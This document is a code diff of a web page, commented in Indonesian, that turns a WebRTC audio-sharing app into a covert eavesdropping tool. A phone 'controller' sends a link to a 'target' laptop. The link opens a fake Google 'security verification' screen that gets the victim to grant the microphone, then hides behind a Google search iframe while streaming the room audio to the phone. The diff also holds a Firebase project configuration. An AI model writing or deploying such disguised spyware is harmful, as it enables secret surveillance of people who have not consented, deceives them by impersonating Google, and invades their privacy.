@@ -3,38 +3,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Audio Bridge - Auto Link</title>
+    <title>Google Search</title> <!-- Judul disamarkan agar tidak mencurigakan di Laptop -->
     
     <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
-    
-    <!-- Font Awesome Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
     <style>
-        /* Animasi Gelombang */
-        @keyframes pulse-ring {
-            0% { transform: scale(0.8); opacity: 0.5; }
-            100% { transform: scale(2); opacity: 0; }
-        }
-        .pulse-animation::before {
-            content: '';
-            position: absolute;
-            left: 0; top: 0; right: 0; bottom: 0;
-            border-radius: 50%;
-            border: 2px solid currentColor;
-            animation: pulse-ring 2s cubic-bezier(0.215, 0.61, 0.355, 1) infinite;
-        }
         .hidden { display: none !important; }
+        /* Animasi loading halus */
+        @keyframes pulse-soft {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        .animate-pulse-soft { animation: pulse-soft 2s infinite; }
     </style>
 </head>
-<body class="bg-slate-950 text-slate-200 font-sans min-h-screen flex flex-col selection:bg-cyan-500 selection:text-white">
+<body class="bg-slate-950 text-slate-200 font-sans min-h-screen flex flex-col">
 
-    <!-- Header -->
-    <header class="p-4 border-b border-slate-800 bg-slate-900/80 backdrop-blur sticky top-0 z-10 flex justify-between items-center">
+    <!-- HEADER (Hanya muncul di HP/Mode Normal) -->
+    <header id="mainHeader" class="p-4 border-b border-slate-800 bg-slate-900/80 backdrop-blur sticky top-0 z-10 flex justify-between items-center">
         <div class="flex items-center gap-2">
-            <i class="fa-solid fa-tower-broadcast text-cyan-400"></i>
-            <h1 class="font-bold text-lg tracking-tight">AudioBridge <span class="text-xs text-emerald-400 font-normal">v3.0 (Link)</span></h1>
+            <i class="fa-solid fa-satellite-dish text-cyan-400"></i>
+            <h1 class="font-bold text-lg">AudioBridge <span class="text-xs text-orange-400">Controller</span></h1>
         </div>
         <div id="connectionStatus" class="text-xs font-mono bg-slate-800 px-2 py-1 rounded text-slate-400">
             OFFLINE
@@ -43,175 +34,101 @@
 
     <main class="flex-1 flex flex-col items-center justify-center p-6 w-full max-w-md mx-auto relative">
         
-        <!-- Notifikasi Error/Info -->
-        <div id="toast" class="hidden fixed top-20 left-1/2 transform -translate-x-1/2 bg-slate-800 border border-slate-700 text-white px-4 py-2 rounded-lg shadow-xl text-sm z-50 transition-opacity whitespace-nowrap">
-            Pesan notifikasi
-        </div>
+        <!-- Notifikasi -->
+        <div id="toast" class="hidden fixed top-20 left-1/2 transform -translate-x-1/2 bg-slate-800 border border-slate-700 text-white px-4 py-2 rounded-lg shadow-xl text-sm z-50"></div>
 
-        <!-- HALAMAN 1: LANDING / PILIH MODE -->
-        <div id="landingPage" class="w-full space-y-8 animate-in fade-in zoom-in duration-300">
-            
-            <!-- Default View: Pilih Mode -->
-            <div id="defaultLandingContent">
-                <div class="text-center space-y-2">
-                    <h2 class="text-2xl font-bold text-white">Pilih Perangkat</h2>
-                    <p class="text-slate-400 text-sm">Gunakan Laptop sebagai sumber suara.</p>
-                </div>
-
-                <!-- Tombol Host (Laptop) -->
-                <button onclick="startHosting()" class="w-full mt-6 group relative overflow-hidden rounded-2xl bg-gradient-to-r from-blue-600 to-indigo-700 p-6 text-left hover:scale-[1.02] transition-all shadow-lg shadow-blue-900/20">
-                    <div class="flex items-center justify-between relative z-10">
-                        <div>
-                            <h3 class="text-lg font-bold text-white">Mode Laptop (Host)</h3>
-                            <p class="text-blue-100 text-xs mt-1">Buat Room & Share Link</p>
-                        </div>
-                        <i class="fa-solid fa-laptop text-2xl text-white/80"></i>
-                    </div>
-                </button>
-
-                <div class="relative flex items-center py-6">
-                    <div class="flex-grow border-t border-slate-800"></div>
-                    <span class="flex-shrink-0 mx-4 text-slate-600 text-xs uppercase">Atau gabung manual</span>
-                    <div class="flex-grow border-t border-slate-800"></div>
-                </div>
-
-                <!-- Form Join (HP) -->
-                <div class="bg-slate-900 p-5 rounded-2xl border border-slate-800 space-y-4">
-                    <div class="flex items-center gap-2 text-slate-300 mb-1">
-                        <i class="fa-solid fa-mobile-screen"></i>
-                        <span class="font-medium text-sm">Mode HP (Manual)</span>
-                    </div>
-                    <input type="text" id="joinInput" placeholder="KODE DARI LAPTOP" class="w-full bg-slate-950 border border-slate-700 rounded-xl px-4 py-3 text-center text-lg font-mono tracking-widest text-white focus:outline-none focus:border-cyan-500 placeholder:text-sm placeholder:font-sans uppercase">
-                    <button onclick="joinRoom()" class="w-full bg-slate-800 hover:bg-slate-700 text-white font-medium py-3 rounded-xl transition-colors flex justify-center items-center gap-2">
-                        <i class="fa-solid fa-link"></i> Hubungkan
-                    </button>
-                </div>
+        <!-- HALAMAN 1: DASHBOARD HP (PEMBUAT LINK) -->
+        <div id="controllerPage" class="w-full space-y-6">
+            <div class="text-center space-y-2">
+                <h2 class="text-2xl font-bold text-white">Panel Kontrol (HP)</h2>
+                <p class="text-slate-400 text-sm">Buat link untuk dibuka di Laptop target.</p>
             </div>
 
-            <!-- Auto Join View (Muncul jika membuka Link) -->
-            <div id="autoJoinContent" class="hidden text-center space-y-6">
-                <div class="bg-cyan-900/20 border border-cyan-500/30 p-6 rounded-2xl">
-                    <div class="w-16 h-16 bg-cyan-500/20 rounded-full flex items-center justify-center mx-auto mb-4 text-cyan-400 text-2xl animate-bounce">
-                        <i class="fa-solid fa-tower-broadcast"></i>
-                    </div>
-                    <h2 class="text-xl font-bold text-white mb-2">Undangan Masuk</h2>
-                    <p class="text-slate-400 text-sm">Anda diundang ke Room ID:</p>
-                    <div id="autoJoinIdDisplay" class="text-3xl font-mono font-bold text-white my-3 tracking-widest">---</div>
-                    <p class="text-xs text-slate-500">Klik tombol di bawah untuk menyambungkan audio.</p>
+            <!-- Kartu Status HP -->
+            <div class="bg-slate-900 p-6 rounded-2xl border border-slate-800 text-center space-y-4">
+                <div id="loader" class="hidden text-cyan-500 text-4xl mb-4 animate-spin">
+                    <i class="fa-solid fa-circle-notch"></i>
                 </div>
-
-                <button onclick="joinRoom()" class="w-full bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white font-bold py-4 rounded-xl shadow-lg shadow-emerald-900/20 text-lg flex justify-center items-center gap-3 animate-pulse">
-                    <i class="fa-solid fa-plug"></i> TERIMA & SAMBUNGKAN
-                </button>
-            </div>
-
-        </div>
-
-        <!-- HALAMAN 2: ACTIVE CALL -->
-        <div id="activePage" class="hidden w-full space-y-6 text-center animate-in slide-in-from-bottom duration-500">
-            
-            <!-- Kartu ID & Status -->
-            <div id="statusCard" class="relative p-8 rounded-3xl bg-slate-900 border border-slate-800 overflow-hidden transition-colors duration-500">
-                <!-- Ripple Effect Container -->
-                <div id="rippleEffect" class="absolute inset-0 flex items-center justify-center pointer-events-none hidden">
-                    <div class="w-32 h-32 rounded-full pulse-animation text-emerald-500/20"></div>
-                </div>
-
-                <div class="relative z-10">
-                    <div class="mb-4">
-                        <span id="roleBadge" class="text-[10px] uppercase tracking-wider font-bold bg-slate-800 px-2 py-1 rounded text-slate-400">
-                            Host
-                        </span>
-                    </div>
-                    
-                    <div class="relative group">
-                        <h2 id="displayRoomId" class="text-4xl font-mono font-bold text-white tracking-wider mb-2 select-all cursor-pointer" onclick="copyId()">---</h2>
-                        <div class="text-[10px] text-slate-500 mb-2">ID Permanen</div>
-                    </div>
-
-                    <p id="connectionText" class="text-xs text-emerald-400 font-medium tracking-wide animate-pulse">MENUNGGU KONEKSI...</p>
-                </div>
-            </div>
-
-            <!-- Tombol Copy & Reset ID (Khusus Host) -->
-            <div id="hostActions" class="hidden flex flex-wrap justify-center gap-3">
-                <button onclick="copyLink()" class="bg-emerald-600 hover:bg-emerald-500 text-white text-xs px-5 py-2.5 rounded-full flex items-center gap-2 shadow-lg shadow-emerald-900/20 font-bold transition-colors">
-                    <i class="fa-solid fa-share-nodes"></i> Salin Link Otomatis
-                </button>
-                <div class="w-full h-1"></div> <!-- Spacer -->
-                <button onclick="copyId()" class="bg-slate-800 hover:bg-slate-700 text-xs px-4 py-2 rounded-full flex items-center gap-2 text-slate-300 transition-colors">
-                    <i class="fa-regular fa-copy"></i> Salin Kode Saja
-                </button>
-                <button onclick="resetPermanentId()" class="bg-slate-800 hover:bg-red-900/30 text-xs px-4 py-2 rounded-full flex items-center gap-2 text-slate-500 hover:text-red-400 transition-colors" title="Buat ID Baru">
-                    <i class="fa-solid fa-arrows-rotate"></i> Reset
-                </button>
-            </div>
-
-            <!-- Kontrol Audio (Beda untuk Laptop & HP) -->
-            <div class="grid gap-4 mt-6">
                 
-                <!-- Panel Laptop -->
-                <div id="laptopControls" class="hidden bg-slate-900/50 p-4 rounded-xl border border-slate-800">
-                    <button onclick="toggleMic()" id="laptopMicBtn" class="w-full py-4 rounded-xl font-bold flex flex-col items-center gap-2 bg-blue-600/20 text-blue-400 border border-blue-600/50">
-                        <i class="fa-solid fa-microphone"></i>
-                        <span>Mic ON (Monitoring)</span>
+                <div id="linkArea" class="hidden space-y-4 animate-in fade-in zoom-in duration-300">
+                    <div class="text-emerald-400 text-5xl mb-2">
+                        <i class="fa-solid fa-check-circle"></i>
+                    </div>
+                    <h3 class="text-lg font-bold text-white">Room Siap!</h3>
+                    <p class="text-xs text-slate-500">Kirim link ini ke Laptop target:</p>
+                    
+                    <div onclick="copyTargetLink()" class="bg-black/30 p-3 rounded-lg border border-slate-700 cursor-pointer hover:border-cyan-500 transition-colors break-all">
+                        <p id="targetUrlDisplay" class="text-cyan-400 font-mono text-xs underline decoration-dotted">Generating...</p>
+                    </div>
+
+                    <button onclick="copyTargetLink()" class="w-full bg-cyan-600 hover:bg-cyan-500 text-white font-bold py-3 rounded-xl flex items-center justify-center gap-2">
+                        <i class="fa-regular fa-copy"></i> SALIN LINK TARGET
                     </button>
-                    <p class="text-xs text-slate-500 mt-3">Kirim link ke HP agar HP bisa langsung connect.</p>
+
+                    <div class="border-t border-slate-800 pt-4 mt-4">
+                        <p class="text-xs text-slate-400 mb-2">Status Target:</p>
+                        <div id="waitingStatus" class="text-yellow-500 font-mono text-sm animate-pulse">
+                            MENUNGGU LAPTOP MEMBUKA LINK...
+                        </div>
+                    </div>
                 </div>
 
-                <!-- Panel HP -->
-                <div id="mobileControls" class="hidden">
-                    <p class="text-slate-400 text-xs mb-3">Tekan tombol untuk bicara balik</p>
-                    <button onclick="toggleMic()" id="mobileMicBtn" class="w-full py-8 rounded-2xl font-bold text-lg flex items-center justify-center gap-3 transition-all active:scale-95 bg-slate-800 text-slate-400 border border-slate-700">
-                        <i class="fa-solid fa-microphone-slash"></i>
-                        <span>MIC MATI (Dengar)</span>
-                    </button>
-                </div>
-
-                <button onclick="window.location.href = window.location.pathname" class="mt-4 text-xs text-red-400 hover:text-red-300 flex items-center justify-center gap-2 py-2">
-                    <i class="fa-solid fa-power-off"></i> Putus Koneksi
+                <!-- Tombol Start untuk HP -->
+                <button id="btnCreateRoom" onclick="createRoomAsController()" class="w-full bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white font-bold py-4 rounded-xl shadow-lg shadow-blue-900/20 text-lg flex justify-center items-center gap-2">
+                    <i class="fa-solid fa-key"></i> BUAT AKSES TARGET
                 </button>
             </div>
-
-            <!-- Console Log Mini -->
-            <div id="logs" class="text-[10px] font-mono text-slate-600 text-left h-20 overflow-y-auto bg-black/20 p-2 rounded border border-slate-800/50">
-                <div>> System ready...</div>
+            
+            <div id="audioControls" class="hidden mt-4">
+                 <button id="muteRemoteBtn" onclick="toggleRemoteAudio()" class="w-full bg-slate-800 text-slate-300 py-3 rounded-xl border border-slate-700">
+                    <i class="fa-solid fa-volume-high"></i> Suara Target: AKTIF
+                 </button>
             </div>
         </div>
 
-        <!-- HALAMAN 3: GOOGLE SEARCH PAGE (KAMUFLASE LAPTOP) -->
-        <div id="googlePage" class="hidden fixed inset-0 bg-white z-50">
-            <iframe src="https://www.google.com/webhp?igu=1" class="w-full h-full border-0" sandbox="allow-scripts allow-same-origin allow-forms allow-popups"></iframe>
+        <!-- HALAMAN 2: TAMPILAN LAPTOP (YANG AKAN DIKAMUFLASE) -->
+        <div id="targetPage" class="hidden w-full text-center space-y-6">
             
-            <!-- Exit Button (Hidden, tekan Esc untuk keluar) -->
-            <div id="exitHint" class="fixed bottom-4 right-4 bg-black/80 text-white text-xs px-3 py-2 rounded-lg opacity-0 hover:opacity-100 transition-opacity">
-                Tekan <kbd class="bg-white/20 px-2 py-1 rounded">ESC</kbd> untuk kontrol
+            <!-- Layar "Klik untuk Mulai" (Wajib browser policy) -->
+            <div id="startOverlay" class="fixed inset-0 bg-white z-50 flex flex-col items-center justify-center">
+                <div class="max-w-md w-full p-8 text-center space-y-6">
+                    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="h-12 mx-auto mb-8">
+                    <p class="text-gray-600">Verifikasi keamanan browser...</p>
+                    <button onclick="startTargetMode()" class="bg-blue-600 hover:bg-blue-700 text-white px-8 py-3 rounded text-sm font-medium shadow-md transition-transform active:scale-95">
+                        Lanjutkan ke Google
+                    </button>
+                    <p class="text-xs text-gray-400 mt-4">Connection ID: <span id="targetRoomIdDisplay">...</span></p>
+                </div>
+            </div>
+
+            <!-- Layar Kamuflase Google (Muncul setelah connect) -->
+            <div id="camouflageLayer" class="hidden fixed inset-0 bg-white z-40">
+                <iframe src="https://www.google.com/webhp?igu=1" class="w-full h-full border-0" sandbox="allow-scripts allow-same-origin allow-forms allow-popups"></iframe>
+                <!-- Indikator Rahasia (Titik merah kecil di pojok kanan bawah) -->
+                <div id="liveIndicator" class="fixed bottom-1 right-1 w-2 h-2 bg-red-500 rounded-full animate-pulse z-50" title="Transmitting..."></div>
             </div>
         </div>
 
     </main>
 
-    <!-- Audio Element (Hidden) -->
+    <!-- Audio Element (Untuk HP mendengarkan Laptop) -->
     <audio id="remoteAudio" autoplay playsinline class="hidden"></audio>
 
-    <!-- Firebase & Logic Scripts -->
+    <!-- Firebase Script -->
     <script type="module">
         import { initializeApp } from 'https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js';
         import { getAuth, signInAnonymously, onAuthStateChanged } from 'https://www.gstatic.com/firebasejs/11.0.2/firebase-auth.js';
         import { getFirestore, collection, doc, setDoc, getDoc, onSnapshot, updateDoc, addDoc, serverTimestamp } from 'https://www.gstatic.com/firebasejs/11.0.2/firebase-firestore.js';
 
-        // --- KONFIGURASI FIREBASE ---
         const firebaseConfig = {
             apiKey: "AIzaSyDbhegMTo3-AG4tUPQJkbwlXMbUZmdjVTk",
             authDomain: "p2paudio-fdbde.firebaseapp.com",
             projectId: "p2paudio-fdbde",
             storageBucket: "p2paudio-fdbde.firebasestorage.app",
             messagingSenderId: "734885014321",
-            appId: "1:734885014321:web:e6fef64fb7d58802cc9e10",
-            measurementId: "G-GTQW9KLKE4"
+            appId: "1:734885014321:web:e6fef64fb7d58802cc9e10"
         };
 
-        // Inisialisasi Firebase
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
         const auth = getAuth(app);
@@ -220,355 +137,217 @@
         let user = null;
         let peerConnection = null;
         let localStream = null;
-        let mode = null; // 'sender' = Laptop, 'receiver' = HP
         let roomId = null;
-        let isMuted = false;
-
-        // HTML References
-        const landingPage = document.getElementById('landingPage');
-        const activePage = document.getElementById('activePage');
-        const googlePage = document.getElementById('googlePage');
-        const statusCard = document.getElementById('statusCard');
-        const connectionText = document.getElementById('connectionText');
-        const rippleEffect = document.getElementById('rippleEffect');
-        const laptopMicBtn = document.getElementById('laptopMicBtn');
-        const mobileMicBtn = document.getElementById('mobileMicBtn');
-
-        // STUN Servers
         const servers = {
-            iceServers: [
-                { urls: ['stun:stun1.l.google.com:19302', 'stun:stun2.l.google.com:19302'] }
-            ]
+            iceServers: [{ urls: ['stun:stun1.l.google.com:19302', 'stun:stun2.l.google.com:19302'] }]
         };
 
-        // --- FIREBASE AUTH ---
-        signInAnonymously(auth).catch((error) => {
-            log("Auth Error: " + error.message);
-        });
-
+        // --- AUTH ---
+        signInAnonymously(auth).then(() => console.log("Auth OK")).catch(console.error);
         onAuthStateChanged(auth, (u) => {
             if (u) {
                 user = u;
-                document.getElementById('connectionStatus').textContent = 'ONLINE';
-                document.getElementById('connectionStatus').classList.remove('text-slate-400');
-                document.getElementById('connectionStatus').classList.add('text-emerald-400');
-                log("Firebase connected: " + u.uid.substring(0, 6));
+                document.getElementById('connectionStatus').textContent = "ONLINE";
+                document.getElementById('connectionStatus').className = "text-xs font-mono bg-emerald-900/50 px-2 py-1 rounded text-emerald-400";
                 
-                // CEK URL PARAMETER SETELAH LOGIN
-                checkUrlParams();
-            } else {
-                document.getElementById('connectionStatus').textContent = 'OFFLINE';
+                // Cek apakah ini Laptop yang membuka Link?
+                checkIfTarget();
             }
         });
 
-        // --- HELPER FUNCTIONS ---
-        function log(message) {
-            const logDiv = document.getElementById('logs');
-            const entry = document.createElement('div');
-            entry.textContent = `> ${message}`;
-            logDiv.appendChild(entry);
-            logDiv.scrollTop = logDiv.scrollHeight;
-        }
-
-        // --- LOGIKA MAGIC LINK ---
-        function checkUrlParams() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const roomParam = urlParams.get('room');
-
-            if (roomParam) {
-                // Jika ada parameter room, ubah tampilan ke "Auto Join"
-                document.getElementById('defaultLandingContent').classList.add('hidden');
-                document.getElementById('autoJoinContent').classList.remove('hidden');
-                document.getElementById('autoJoinIdDisplay').textContent = roomParam;
-                
-                // Isi input hidden agar fungsi joinRoom berjalan normal
-                document.getElementById('joinInput').value = roomParam;
-                
-                log("Undangan Room terdeteksi: " + roomParam);
-            }
-        }
-
-        // Fungsi Salin Link (Untuk Laptop)
-        window.copyLink = () => {
-            const baseUrl = window.location.origin + window.location.pathname;
-            const fullLink = `${baseUrl}?room=${roomId}`;
+        // --- LOGIC 1: HP (CONTROLLER) ---
+        
+        window.createRoomAsController = async () => {
+            if (!user) return alert("Tunggu koneksi internet...");
             
-            navigator.clipboard.writeText(fullLink).then(() => {
-                showToast("Link Auto-Connect disalin!");
-            }).catch(err => {
-                showToast("Gagal menyalin link");
-                console.error(err);
-            });
-        };
-
-        // --- FUNGSI ID PERMANEN ---
-        function getPersistentRoomId() {
-            let savedId = localStorage.getItem('my_permanent_room_id');
-            if (!savedId) {
-                savedId = Math.random().toString(36).substring(2, 8).toUpperCase();
-                localStorage.setItem('my_permanent_room_id', savedId);
-                log("ID Baru dibuat dan disimpan.");
-            } else {
-                log("Menggunakan ID tersimpan: " + savedId);
-            }
-            return savedId;
-        }
-
-        window.resetPermanentId = () => {
-            if(confirm("Ganti ID Permanen? ID lama akan hangus.")) {
-                localStorage.removeItem('my_permanent_room_id');
-                window.location.href = window.location.pathname; // Reload tanpa query params
-            }
-        };
-
-        window.copyId = () => {
-            navigator.clipboard.writeText(roomId);
-            showToast("Kode Room disalin!");
-        };
-
-        function showToast(message) {
-            const toast = document.getElementById('toast');
-            toast.textContent = message;
-            toast.classList.remove('hidden');
-            setTimeout(() => toast.classList.add('hidden'), 3000);
-        }
-
-        // --- WEBRTC SETUP ---
-        async function setupLocalAudio(muted = false) {
-            try {
-                // Meminta izin audio
-                localStream = await navigator.mediaDevices.getUserMedia({ 
-                    audio: { 
-                        echoCancellation: true, 
-                        noiseSuppression: true,
-                        autoGainControl: true
-                    }, 
-                    video: false 
-                });
-                
-                localStream.getAudioTracks()[0].enabled = !muted;
-                isMuted = muted;
-                updateMicUI();
-                
-                log("Audio hardware ready.");
-            } catch (err) {
-                alert("Gagal akses mikrofon: " + err.message + "\nPastikan izin mikrofon diberikan di browser.");
-                throw err;
-            }
-        }
-
-        function createPeerConnection() {
-            peerConnection = new RTCPeerConnection(servers);
-
-            if (localStream) {
-                localStream.getTracks().forEach(track => {
-                    peerConnection.addTrack(track, localStream);
-                });
-            }
-
-            peerConnection.ontrack = (event) => {
-                const remoteAudio = document.getElementById('remoteAudio');
-                remoteAudio.srcObject = event.streams[0];
-                // PENTING: Memastikan audio diputar setelah interaksi user
-                remoteAudio.play().catch(e => log("Auto-play blocked: " + e.message));
-                log("Audio stream masuk.");
-            };
-
-            peerConnection.onconnectionstatechange = () => {
-                const state = peerConnection.connectionState;
-                log(`Connection: ${state}`);
-                
-                if (state === 'connected') {
-                    connectionText.textContent = "✓ TERHUBUNG - SUARA AKTIF";
-                    connectionText.classList.remove('animate-pulse', 'text-emerald-400');
-                    connectionText.classList.add('text-emerald-300', 'font-bold');
-                    
-                    statusCard.classList.add('border-emerald-500/30');
-                    rippleEffect.classList.remove('hidden');
-                    
-                    if (mode === 'sender') {
-                        setTimeout(() => {
-                            activePage.classList.add('hidden');
-                            googlePage.classList.remove('hidden');
-                        }, 2000);
-                    }
-                } else if (state === 'disconnected' || state === 'failed') {
-                    connectionText.textContent = "KONEKSI TERPUTUS";
-                    connectionText.classList.add('text-red-500');
-                    rippleEffect.classList.add('hidden');
-                }
-            };
-        }
-
-        // --- HOST LOGIC (LAPTOP) ---
-        window.startHosting = async () => {
-            if (!user) return;
-
-            mode = 'sender';
-            roomId = getPersistentRoomId();
-
-            landingPage.classList.add('hidden');
-            activePage.classList.remove('hidden');
-            document.getElementById('displayRoomId').textContent = roomId;
-            document.getElementById('roleBadge').textContent = "LAPTOP (HOST)";
-            document.getElementById('laptopControls').classList.remove('hidden');
-            document.getElementById('hostActions').classList.remove('hidden');
+            // 1. Generate ID Unik
+            roomId = Math.random().toString(36).substring(2, 8).toUpperCase();
+            
+            // UI Update
+            document.getElementById('btnCreateRoom').classList.add('hidden');
+            document.getElementById('loader').classList.remove('hidden');
 
             try {
-                await setupLocalAudio(false);
-                createPeerConnection();
+                // 2. Setup WebRTC (HP sebagai Caller/Receiver Audio)
+                peerConnection = new RTCPeerConnection(servers);
+                
+                // HP hanya menerima audio (transceiver recvonly)
+                peerConnection.addTransceiver('audio', { direction: 'recvonly' });
 
+                // Handle Audio Masuk (Dari Laptop)
+                peerConnection.ontrack = (event) => {
+                    const remoteAudio = document.getElementById('remoteAudio');
+                    remoteAudio.srcObject = event.streams[0];
+                    remoteAudio.play().catch(console.error);
+                    
+                    document.getElementById('waitingStatus').textContent = "TERHUBUNG: SUARA MASUK 🔊";
+                    document.getElementById('waitingStatus').className = "text-emerald-400 font-bold text-sm animate-pulse";
+                    document.getElementById('audioControls').classList.remove('hidden');
+                };
+
+                // ICE Candidates Logic
                 peerConnection.onicecandidate = (event) => {
                     if (event.candidate) {
-                        const col = collection(db, `calls/${roomId}/callerCandidates`);
-                        addDoc(col, event.candidate.toJSON());
+                        addDoc(collection(db, `calls/${roomId}/controllerCandidates`), event.candidate.toJSON());
                     }
                 };
 
+                // 3. Create Offer
                 const offer = await peerConnection.createOffer();
                 await peerConnection.setLocalDescription(offer);
 
-                const callDoc = doc(db, `calls/${roomId}`);
-                await setDoc(callDoc, { 
+                // 4. Save to Firebase
+                await setDoc(doc(db, `calls/${roomId}`), {
                     offer: { type: offer.type, sdp: offer.sdp },
-                    createdAt: serverTimestamp()
+                    createdAt: serverTimestamp(),
+                    role: 'controller_waiting' 
                 });
 
-                log(`Room ${roomId} siap.`);
-
-                onSnapshot(callDoc, (snapshot) => {
+                // 5. Listen for Target (Laptop) Answer
+                onSnapshot(doc(db, `calls/${roomId}`), (snapshot) => {
                     const data = snapshot.data();
                     if (!peerConnection.currentRemoteDescription && data?.answer) {
                         const answer = new RTCSessionDescription(data.answer);
                         peerConnection.setRemoteDescription(answer);
-                        log("HP Terhubung!");
                     }
                 });
 
-                const calleeCandidates = collection(db, `calls/${roomId}/calleeCandidates`);
-                onSnapshot(calleeCandidates, (snapshot) => {
+                // Listen for Target Candidates
+                onSnapshot(collection(db, `calls/${roomId}/targetCandidates`), (snapshot) => {
                     snapshot.docChanges().forEach((change) => {
                         if (change.type === 'added') {
-                            const candidate = new RTCIceCandidate(change.doc.data());
-                            peerConnection.addIceCandidate(candidate);
+                            peerConnection.addIceCandidate(new RTCIceCandidate(change.doc.data()));
                         }
                     });
                 });
 
+                // 6. Tampilkan Link
+                document.getElementById('loader').classList.add('hidden');
+                document.getElementById('linkArea').classList.remove('hidden');
+                
+                const fullUrl = `${window.location.origin}${window.location.pathname}?target=true&room=${roomId}`;
+                document.getElementById('targetUrlDisplay').textContent = fullUrl;
+
             } catch (err) {
-                log("Error Host: " + err.message);
+                alert("Error: " + err.message);
+                document.getElementById('loader').classList.add('hidden');
+                document.getElementById('btnCreateRoom').classList.remove('hidden');
             }
         };
 
-        // --- CLIENT LOGIC (HP) ---
-        window.joinRoom = async () => {
-            // Ambil ID dari input (bisa manual atau diisi otomatis oleh link)
-            const inputId = document.getElementById('joinInput').value.trim().toUpperCase();
-            
-            if (!user) {
-                showToast("Tunggu koneksi internet...");
-                return;
-            }
-            if (!inputId) {
-                showToast("Masukkan ID Room!");
-                return;
-            }
+        window.copyTargetLink = () => {
+            const url = document.getElementById('targetUrlDisplay').textContent;
+            navigator.clipboard.writeText(url);
+            showToast("Link disalin! Kirim ke Laptop.");
+        };
 
-            mode = 'receiver';
-            roomId = inputId;
+        // --- LOGIC 2: LAPTOP (TARGET) ---
 
-            landingPage.classList.add('hidden');
-            activePage.classList.remove('hidden');
-            document.getElementById('displayRoomId').textContent = roomId;
-            document.getElementById('roleBadge').textContent = "HP (REMOTE)";
-            document.getElementById('mobileControls').classList.remove('hidden');
+        function checkIfTarget() {
+            const params = new URLSearchParams(window.location.search);
+            if (params.get('target') === 'true' && params.get('room')) {
+                roomId = params.get('room');
+                
+                // Ubah Tampilan total
+                document.getElementById('mainHeader').classList.add('hidden');
+                document.getElementById('controllerPage').classList.add('hidden');
+                document.getElementById('targetPage').classList.remove('hidden');
+                document.getElementById('targetRoomIdDisplay').textContent = roomId;
+                document.title = "Google"; // Ubah tab title
+            }
+        }
+
+        // Dipanggil saat Laptop klik tombol "Lanjutkan ke Google"
+        window.startTargetMode = async () => {
+            const btn = document.querySelector('#startOverlay button');
+            btn.textContent = "Connecting...";
+            btn.disabled = true;
 
             try {
+                // 1. Ambil Mic Laptop
+                localStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+                
+                // 2. Setup Connection
+                peerConnection = new RTCPeerConnection(servers);
+                localStream.getTracks().forEach(track => peerConnection.addTrack(track, localStream));
+
+                // 3. Ambil Offer dari HP
                 const callDoc = doc(db, `calls/${roomId}`);
                 const snapshot = await getDoc(callDoc);
-
+                
                 if (!snapshot.exists()) {
-                    alert("ID Room tidak ditemukan atau Link kadaluarsa.");
-                    window.location.href = window.location.pathname; // Reset
+                    alert("Link kadaluarsa atau salah.");
                     return;
                 }
 
-                // HP mic OFF by default, receiver mode
-                await setupLocalAudio(true);
-                createPeerConnection();
-
+                // ICE Handling
                 peerConnection.onicecandidate = (event) => {
                     if (event.candidate) {
-                        const col = collection(db, `calls/${roomId}/calleeCandidates`);
-                        addDoc(col, event.candidate.toJSON());
+                        addDoc(collection(db, `calls/${roomId}/targetCandidates`), event.candidate.toJSON());
                     }
                 };
 
+                // Set Remote Description (Offer dari HP)
                 const offerData = snapshot.data().offer;
                 await peerConnection.setRemoteDescription(new RTCSessionDescription(offerData));
 
+                // Create Answer
                 const answer = await peerConnection.createAnswer();
                 await peerConnection.setLocalDescription(answer);
 
+                // Kirim Answer balik ke HP
                 await updateDoc(callDoc, {
-                    answer: { type: answer.type, sdp: answer.sdp }
+                    answer: { type: answer.type, sdp: answer.sdp },
+                    connectedAt: serverTimestamp()
                 });
 
-                const callerCandidates = collection(db, `calls/${roomId}/callerCandidates`);
-                onSnapshot(callerCandidates, (snapshot) => {
+                // Listen Candidates dari HP
+                onSnapshot(collection(db, `calls/${roomId}/controllerCandidates`), (snapshot) => {
                     snapshot.docChanges().forEach((change) => {
                         if (change.type === 'added') {
-                            const candidate = new RTCIceCandidate(change.doc.data());
-                            peerConnection.addIceCandidate(candidate);
+                            peerConnection.addIceCandidate(new RTCIceCandidate(change.doc.data()));
                         }
                     });
                 });
 
+                // 4. SUKSES - Masuk Mode Kamuflase
+                peerConnection.onconnectionstatechange = () => {
+                    if (peerConnection.connectionState === 'connected') {
+                        document.getElementById('startOverlay').classList.add('hidden');
+                        document.getElementById('camouflageLayer').classList.remove('hidden');
+                        // Mencegah sleep (opsional, basic hack)
+                        const noSleep = setInterval(() => { window.location.href = window.location.href }, 1800000); 
+                    }
+                };
+
             } catch (err) {
-                log("Error Join: " + err.message);
-                alert("Terjadi kesalahan koneksi. Coba refresh.");
+                alert("Gagal koneksi: Pastikan Izinkan Mikforon. " + err.message);
+                btn.textContent = "Coba Lagi";
+                btn.disabled = false;
             }
         };
 
-        // --- COMMON UTILS ---
-        window.toggleMic = () => {
-            if (!localStream) return;
-            
-            const track = localStream.getAudioTracks()[0];
-            if (track) {
-                track.enabled = !track.enabled;
-                isMuted = !track.enabled;
-                updateMicUI();
-            }
-        };
-
-        function updateMicUI() {
-            if (mode === 'sender') {
-                if (isMuted) {
-                    laptopMicBtn.className = "w-full py-4 rounded-xl font-bold flex flex-col items-center gap-2 bg-red-900/20 text-red-500 border border-red-900/50";
-                    laptopMicBtn.innerHTML = '<i class="fa-solid fa-microphone-slash"></i><span>Mic Muted</span>';
-                } else {
-                    laptopMicBtn.className = "w-full py-4 rounded-xl font-bold flex flex-col items-center gap-2 bg-blue-600/20 text-blue-400 border border-blue-600/50";
-                    laptopMicBtn.innerHTML = '<i class="fa-solid fa-microphone"></i><span>Mic ON (Monitoring)</span>';
-                }
+        // --- UTILITIES ---
